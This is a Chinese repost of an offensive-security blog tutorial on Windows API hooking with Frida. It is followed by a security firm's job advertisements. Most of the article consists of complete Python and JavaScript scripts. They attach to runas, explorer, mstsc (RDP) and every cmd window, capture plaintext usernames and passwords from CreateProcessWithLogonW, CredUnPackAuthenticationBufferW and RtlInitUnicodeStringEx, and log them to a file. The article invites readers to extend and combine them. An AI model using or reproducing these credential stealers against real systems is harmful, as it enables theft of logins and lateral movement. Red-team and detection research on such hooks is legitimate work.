> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Ha_bLEoQssILtWjpLYsWCQ)

**STATEMENT**

**声明**

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

**No.1 简介**

众所周知，Hooking 已经算不上什么新概念了，并且各大 AV/EDR 供应商早就采用这种技术来监控可疑的 API 调用了。在这篇文章中，我们将从攻击性的角度来探讨 API hooking 技术。首先，我们将借助 API Monitor 来考察每个程序所使用的 API 调用，然后，使用 Frida 和 python 来打造我们的终极 hooking 脚本。这篇文章的灵感来自于 Red Teaming Experiments 团队的一篇博客文章。

**No.2 API Monitor**

在监控 api 调用方面，Api Monitor 是一个非常不错的选择，读者可以从这里下载到它。

启动 Api Monitor 后，其主屏幕如下所示：

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuo4RiabGaN2vMTMkMAuDMpicwS3Br6KuCRhsClUymq0tRVTs9RP2iaBmmiaw/640?wx_fmt=png)

如您所见，这里已经选择了所有的库选项，以尽可能多的捕捉 API。下面，让我们从监控一个新的进程开始入手，为此，我们可以选择 runas.exe。

根据微软官方文档的介绍：

```
它允许用户以不同于用户当前登录时所提供的权限来运行特定的工具和程序。
```

对我来说，作为一个开始，这个程序看起来再合适不过了。

打开 runas 并尝试以不同的用户身份登录，我们就能看到上述 API 调用：

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuoQhriaIiaHW1Fg7M2KkoPluEmkmzGTOHEskTzNuImFcXqqXbcXRyL6eNw/640?wx_fmt=png)

很好，由此可知：在 CreateProcessWithLogonW api 调用中，会存放我们的凭证信息。看一下微软的文档，我们就会发现，第 1 个和第 3 个参数分别用于存储用户名和密码。现在，既然已经知道了这些，那就赶紧编写相应的脚本吧！

**No.3 Frida**

据 Frida 官方网站介绍：

它是用于原生应用程序的 Gresemonkey，或者，用更专业的术语来说，它是一个动态代码插桩工具包。通过它，您可以将 JavaScript 代码或自己的库注入到 Windows、MacOS、GNU/Linux、iOS、Android 和 QNX 系统上的本地应用程序中。此外，Frida 还为您提供了一些构建在 Frida API 之上的简单工具。这些代码既可以按原样使用，也可以根据您的需要进行调整，还可以作为 API 使用方法的范例。

接下来，我们将构建一个 JavaScript 代码段，其作用是从 DLL 库 Advapi.dll 中获取函数的名称。具体脚本如下所示：

```
var CreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW') // exporting the function from the dll library

Interceptor.attach(CreateProcessWithLogonW, { // getting our juice arguments (according to microsoft docs)
  onEnter: function (args) {
    this.lpUsername = args[0];
    this.lpDomain = args[1];
    this.lpPassword = args[2];
    this.lpCommandLine = args[5];
  },
  onLeave: function (args) { // getting the plain text credentials 
    send("\\n=============================" + "\\n[+] Retrieving Creds from RunAs.." +"\\n Username    : " + this.lpUsername.readUtf16String() + "\\nCommandline : " + this.lpCommandLine.readUtf16String() + "\\nDomain      : " + this.lpDomain.readUtf16String() + "\\nPassword    : " + this.lpPassword.readUtf16String()+ "\\n=============================");

  }

});
```

现在，剩下的工作就是将 JavaScript 片段插入到一个 python 脚本中，最终的 python 脚本如下所示：

```
# Wrriten by Ilan Kalendarov

from __future__ import print_function
import frida
from time import sleep
import psutil
from threading import Lock, Thread

# Locking the runas thread to prevent other threads

#interfering with our current session
lockRunas = Lock()  

def on_message_runas(message, data):
  # Executes when the user enters the password.
  # Then, open the txt file and append the data.
  print(message)
  if message['type'] == "send":
    with open("Creds.txt", "a") as f:
      f.write(message["payload"] + '\n')
    try:
      lockRunas.release()
      print("[+] released")
    except Exception:
      pass


def WaitForRunAs():
  while True:
    # Trying to find if runas is running if so, execute the "RunAs" function.
    if ("runas.exe" in (p.name() for p in psutil.process_iter())) and not lockRunas.locked():
      lockRunas.acquire() # Locking the runas thread
      print("[+] Found RunAs")
      RunAs()
      sleep(0.5)

    # If the user regret and they "ctrl+c" from runas then release the thread lock and start over.
    elif (not "runas.exe" in (p.name() for p in psutil.process_iter())) and lockRunas.locked():
      lockRunas.release()
      print("[+] Runas is dead releasing lock")
    else:
      pass
    sleep(0.5)

def RunAs():
  try:
    # Attaching to the runas process
    print("[+] Trying To Attach To Runas")
    session = frida.attach("runas.exe")
    print("[+] Attached runas!")

    # Executing the following javascript
    # We Listen to the CreateProcessWithLogonW func from Advapi32.dll to catch the username,password,domain and the executing program       in plain text.
    script = session.create_script("""
  
    var CreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW') // exporting the function from     the dll library
    Interceptor.attach(CreateProcessWithLogonW, { // getting our juice arguments (according to microsoft docs)
      onEnter: function (args) {
        this.lpUsername = args[0];
        this.lpDomain = args[1];
        this.lpPassword = args[2];
        this.lpCommandLine = args[5];
      },
      onLeave: function (args) { // getting the plain text credentials 
        send("\\n=============================" + "\\n[+] Retrieving Creds from RunAs.." +"\\n Username    : " + this.lpUsername.readUtf16String() + "\\nCommandline : " + this.lpCommandLine.readUtf16String() + "\\nDomain      : " + this.lpDomain.readUtf16String() + "\\nPassword    : " + this.lpPassword.readUtf16String()+ "\\n=============================");
  
      }
    });
  
    """)
  
    # If we got a hit then execute the "on_message_runas" function
    script.on('message', on_message_runas)
    script.load()
  except Exception as e:
    print(str(e))

if __name__ == "__main__":
  thread = Thread(target=WaitForRunAs)
  thread.start()
```

很好！让我们运行这个脚本：

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuoqK3Gib0fhIEauJibmDib8IEvBaTRDQkqiajkYUh71KNLNFn7LFcPDY3F6g/640?wx_fmt=png)

**No.4 Credentials Prompt**

**（即 Graphical Runas）**

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuo4HRf4FITd6RnP3BbHtqv8lHIxsuEfnGNONZGyxVrWo9uTf1IozKr5A/640?wx_fmt=png)

要想实现凭证提示功能，其实非常简单，因为具体步骤基本上跟 runas 的 CLI 版本没有什么两样。首先，让我们启动 API Monitor，然后，利用 API Monitor 中的进程定位器，我们就可以看到该进程是 explorer.exe：

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuon37WnzbVaY1e2u7JVtUk6JQDr9BrSVeHibeQLT65v2A8GlxalibWEg3Q/640?wx_fmt=png)

然后，通过前面的步骤，我就能够发现 Credui.dll 的 CredUnPackAuthenticationBufferW 函数被调用了。

根据微软的官方文档：

CredUnPackAuthenticationBuffer 函数将调用 CredUIPromptForWindowsCredentials 函数，以便把返回的认证缓冲区中的内容转换为一个字符串，即用户名和密码。

这样的话，我们就可以编写相应的 JavaScript 和 python 脚本了，具体代码如下所示：

```
# Wrriten by Ilan Kalendarov

from __future__ import print_function
import frida
from time import sleep
import psutil
from threading import Lock, Thread
import sys

def on_message_credui(message, data):
  # Executes when the user enters the credentials inside the Graphical runas prompt.
  # Then, open a txt file and appends the data.
  print(message)
  if message['type'] == "send":
    with open("Creds.txt", "a") as f:
      f.write(message["payload"] + '\n')


def CredUI():
  # Explorer is always running so no while loop is needed.

  # Attaching to the explorer process
  session = frida.attach("explorer.exe")
  
  # Executing the following javascript
  # We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the user and pass in plain text
  script = session.create_script("""
  
  var username;
  var password;
  var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")
  
  Interceptor.attach(CredUnPackAuthenticationBufferW, {
    onEnter: function (args) 
    {
  
      username = args[3];
      password = args[7];
    },
    onLeave: function (result)
    {
       
      var user = username.readUtf16String()
      var pass = password.readUtf16String()
  
      if (user && pass)
      {
        send("\\n+ Intercepted CredUI Credentials\\n" + user + ":" + pass)
      }
    }
  });
  
  """)
  # If we found the user and pass then execute "on_message_credui" function
  script.on('message', on_message_credui)
  script.load()
  sys.stdin.read()

if __name__ == "__main__":
  CredUI()
```

**No.5 RDP**

拜读 MDSec 与 Red Teaming Experiments 的博客后，我心想，肯定能找到一种简单的方法来钩取 RDP 凭证。

下面，让我们来对比一下 Graphical Runas 的提示与 RDP 的登录提示，它们看起来非常接近：

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuoI9bl0ibZaQthhgPeXHzDpzFE4OEQEshwkasIFsxV68Pia5e11Fuspnmw/640?wx_fmt=png)

那么，它们是否使用的是同一个 API 调用呢？让我们来试试看。

使用与 Credentials Prompt 完全相同的脚本，我们仍然能够获得 RDP 凭证！

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuoibcSU39jE2MJEx0JPNT1SCGS5gyiccaTr7IQ6H8KzEVpRQxibvVTysWfA/640?wx_fmt=png)

剩下的事情，就是编写相应的 python 脚本了，具体代码如下所示：

```
# Wrriten by Ilan Kalendarov

from __future__ import print_function
import frida
from time import sleep
import psutil
from threading import Lock, Thread
import sys

# Locking the mstsc thread to prevent other threads

#interfering with our current session
lockRDP= Lock()  

def on_message_rdp(message, data):
  # Executes when the user enters the password.
  # Then, open the txt file and append the data.
  print(message)
  if message['type'] == "send":
    with open("Creds.txt", "a") as f:
      f.write(message["payload"] + '\n')
    try:
      lockRDP.release()
      print("[+] released")
    except Exception:
      pass


def WaitForRDP():
  while True:
    # Trying to find if mstsc is running if so, execute the "RunAs" function.
    if ("mstsc.exe" in (p.name() for p in psutil.process_iter())) and not lockRDP.locked():
      lockRDP.acquire() # Locking the mstsc thread
      print("[+] Found RunAs")
      RDP()
      sleep(0.5)

    # If the user regret and they close mstsc then we will release the thread lock and start over.
    elif (not "mstsc.exe" in (p.name() for p in psutil.process_iter())) and lockRDP.locked():
      lockRDP.release()
      print("[+] RDP is dead releasing lock")
    else:
      pass
    sleep(0.5)

def RDP():
  try:
    # Attaching to the mstsc process
    print("[+] Trying To Attach To RDP")
    session = frida.attach("mstsc.exe")
    print("[+] Attached to mstsc!")

    # Executing the following javascript
    # We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the username,password,domain and the executing     program in plain text.
    script = session.create_script("""
  
    var username;
    var password;
    var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")
  
    Interceptor.attach(CredUnPackAuthenticationBufferW, {
      onEnter: function (args) 
      {
  
        username = args[3];
        password = args[7];
      },
      onLeave: function (result)
      {
         
        var user = username.readUtf16String()
        var pass = password.readUtf16String()
  
        if (user && pass)
        {
          send("\\n+ Intercepted RDP Credentials\\n" + user + ":" + pass)
        }
      }
    });
  
    """)
    # If we got a hit then execute the "on_message_rdp" function
    script.on('message', on_message_rdp)
    script.load()
  except Exception as e:
    print(str(e))

if __name__ == "__main__":
  thread = Thread(target=WaitForRDP)
  thread.start()
```

执行上面的脚本，结果如下所示：

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuoibNWB8fqeCW0144KYISBLwoZMr0KI9cy4aQxONFTicnSdI5QrGeXHW9Q/640?wx_fmt=png)

**No.6 PsExec**

最后（但并非最不重要）要介绍的是 PsExec——来自 sysinternals 套件的远程执行工具。首先，让我们打开 API Monitor，然后，用正确的参数加载 PsExec，结果如下所示：

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuoAibmAMWshROcCNAT6XtEl2QqgdhXpjdQibbUY7SxWVbgwc7mSWqhiaYzg/640?wx_fmt=png)

WNetAddConnection2W 是存放我们的凭证信息的函数。如果我们尝试捕获这些信息，通常会遇到一个问题：Frida 没有足够的时间附加到 PsExec.exe 进程，因为我们把密码作为一个参数提供：

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuoOstYTfozibjrwyVuNernHHKy8YTMEjUWr7WeDSIJRM95SRdk4X6PuWw/640?wx_fmt=png)

由于脚本的速度不够快，致使无法捕捉到凭证，因此，我们需要另寻他法。面对这种情况，我想，如果我们把在命令提示符里面输入的所有内容都 hook 住，结果会怎么样呢？让我们试试看。这一次我将尝试监视命令提示符，并查找我们的凭证信息：

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuoiaGZEpHXekr72nWrbOpIMxicEX5xEnJJCmLS78FAs7OlkOKNeqBrBFLg/640?wx_fmt=png)

我们可以看到下面有一个新的线程，搜索由 Ntdll.dll 中的 RtlInitUnicodeStringEx 函数生成的密码。不幸的是，像大多数 Ntdll 库一样，Microsoft 并没有提供相应的说明文档。但是我们可以看到函数接受的参数。其中，第二个参数 SourceString 看起来很有趣，因为它包含整个命令，我们还可以看到该函数被多次使用，基本上每次用户向命令提示符输入时都会调用它，因此，我们都需要构建一个过滤机制来过滤不需要的垃圾数据。

最终的脚本如下所示：

```
# Wrriten by Ilan Kalendarov

from __future__ import print_function
import frida
from time import sleep
import psutil
from threading import Lock, Thread
import sys

# Locking the cmd thread to prevent other threads

#interfering with our current session
lockCmd = Lock()

def on_message_cmd(message, data):
  # Executes when the user enters the right keyword from the array above.
  # Then, open the txt file and append it

  #filter the wanted args
  arr = ["-p", "pass", "password"]
  if any(name for name in arr if name in message['payload']):
    print(message['payload'])
    with open("Creds.txt", "a") as f:
      f.write(message['payload'] + '\n')
    try:
      lockCmd.release()
      print("[+] released")
    except Exception:
      pass


def WaitForCmd():
  numOfCmd = []
  while True:
    #  Trying to find if cmd is running if so, execute the "CMD" function.
    if ("cmd.exe" in (p.name() for p in psutil.process_iter())):
      process = filter(lambda p: p.name() == "cmd.exe", psutil.process_iter())
      for i in process:
        # if we alredy hooked the cmd window,pass
        if (i.pid not in numOfCmd):
          #IF a new cmd window pops add it to the array, we want to hook
          #evey cmd window
          numOfCmd.append(i.pid)
          lockCmd.acquire()
          print("[+] Found cmd")
          Cmd(i.pid)
          lockCmd.release()
          sleep(0.5)

    # if cmd is dead release the lock
    elif (not "cmd.exe" in (p.name() for p in psutil.process_iter())) and lockCmd.locked():
      lockCmd.release()
      print("[+] cmd is dead releasing lock")
    else:
      pass
    sleep(0.5)

def Cmd(Cmdpid):
  try:
    # attaching to the cmd window, this time with the right pid
    print("[+] Trying To Attach To cmd")
    session = frida.attach(Cmdpid)
    print("[+] Attached cmd with pid {}!".format(Cmdpid))
    script = session.create_script("""
      var username;
      var password;
      var CredUnPackAuthenticationBufferW = Module.findExportByName("Ntdll.dll", "RtlInitUnicodeStringEx")      
      Interceptor.attach(CredUnPackAuthenticationBufferW, {
        onEnter: function (args) 
        {
          password = args[1];
        },
        onLeave: function (result)
        {
          // Credentials are now decrypted
          var pass = password.readUtf16String();
      

          if (pass)
          {
            send("\\n+ Intercepted cmd Creds\\n" + ":" + pass);
          }
        }
      });
  
    """)
    script.on('message', on_message_cmd)
    script.load()
  except Exception as e:
    print(str(e))

if __name__ == "__main__":
  thread = Thread(target=WaitForCmd)
  thread.start()
```

其运行结果如下所示：

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JW6o36ZrKicEHhCJd5dnJyuouCzQ2aNv4rL646shN0B8W6eNA2BlAccYxcuib28UhiasxhIwftKMVUSA/640?wx_fmt=png)

很好！我们终于能够拦截登陆凭证了。

**No.7 小结**

这是本人的第一篇博客，希望以后还会有更多的博客与大家见面。通过研究这个主题，我学到了很多东西。您可以扩展脚本，以满足您的个人需要，甚至可以将它们组合在一起。同时，强烈建议您提供反馈、补充或更正。

**No.8 链接与资源**

**Instrumeting Windows APIs With Frida** 

- https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/instrumenting-windows-apis-with-frida

**RdpThief** 

- https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/

**Frida**

- https://frida.re/

**Api Monitor**

- http://www.rohitab.com/apimonitor

原文地址：

https://ilankalendarov.github.io/posts/offensive-hooking/

**RECRUITMENT**

**招聘启事**

**安恒雷神众测 SRC 运营（实习生）**  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

**设计师（实习生）**  

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；

3、精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
4、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  

————————  
公司：安恒信息  
岗位：**Web 安全 安全研究员**  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：**安全红队武器自动化工程师**  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至

bountyteam@dbappsecurity.com.cn

岗位：**红队武器化 Golang 开发工程师**  

薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 掌握 C/C++/Java/Go/Python/JavaScript 等至少一门语言作为主要开发语言；  
2. 熟练使用 Gin、Beego、Echo 等常用 web 开发框架、熟悉 MySQL、Redis、MongoDB 等主流数据库结构的设计, 有独立部署调优经验；  
3. 了解 docker，能进行简单的项目部署；  
3. 熟悉常见 web 漏洞原理，并能写出对应的利用工具；  
4. 熟悉 TCP/IP 协议的基本运作原理；  
5. 对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式、消息队列等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。  
简历投递至

bountyteam@dbappsecurity.com.cn

END

![图片](https://mmbiz.qpic.cn/mmbiz_gif/CtGxzWjGs5uX46SOybVAyYzY0p5icTsasu9JSeiaic9ambRjmGVWuvxFbhbhPCQ34sRDicJwibicBqDzJQx8GIM3AQXQ/640?wx_fmt=gif)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JUtWVUtGyNMRco3QkL4hMnIdIznBrxZB2picXpSkW7aJQH1BI0vU8Dqaszu3lbYibfPUbOfScFV0ACg/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/0BNKhibhMh8eiasiaBAEsmWfxYRZOZdgDBevusQUZzjTCG5QB8B4wgy8TSMiapKsHymVU4PnYYPrSgtQLwArW5QMUA/640?wx_fmt=gif)

**长按识别二维码关注我们**